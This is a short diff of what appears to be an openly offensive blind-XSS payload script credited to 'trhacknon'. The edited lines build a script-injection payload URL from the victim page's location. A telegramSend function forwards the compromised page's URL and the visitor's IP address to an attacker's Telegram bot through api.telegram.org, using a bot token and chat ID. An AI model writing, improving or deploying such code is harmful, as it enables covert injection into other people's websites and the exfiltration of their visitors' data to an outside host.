@@ -59,14 +59,14 @@ ${ipAddress}
 🚀 This is Blind XSS Madness! 🚀
 Check out the chaos:
 - [Target Page](${document.location.href})
-- [Payload Execution](${document.location.href + encodeURIComponent('<script>alert("Blind XSS Madness!");</script>')})
+- [Payload Execution](${document.location.href + '?payload=<script>alert("Blind XSS Madness!");</script>'})
 `;
 
     alert(popupContent);
 }
 
 function telegramSend(textData, ipAddress) {
-    var payloadLink = encodeURIComponent('<script>alert("Blind XSS Madness!");</script>');
+    var payloadLink = `${document.location.href}?payload=<script>alert("Blind XSS Madness!");</script>`;
 
     var telegramMessage = `
 🚀 Blind XSS Madness Alert by trhacknon 🚀
@@ -76,7 +76,7 @@ function telegramSend(textData, ipAddress) {
 ${document.location.href}
 
 - Payload Execution -
-[${payloadLink}](https://api.telegram.org/bot${tokenBot}/sendMessage?chat_id=${chatId}&text=${payloadLink}&parse_mode=html)
+[${payloadLink}](https://api.telegram.org/bot${tokenBot}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent("Blind XSS Madness! Check out the chaos: " + payloadLink)}&parse_mode=html)
 
 - IP Address -
 ${ipAddress}
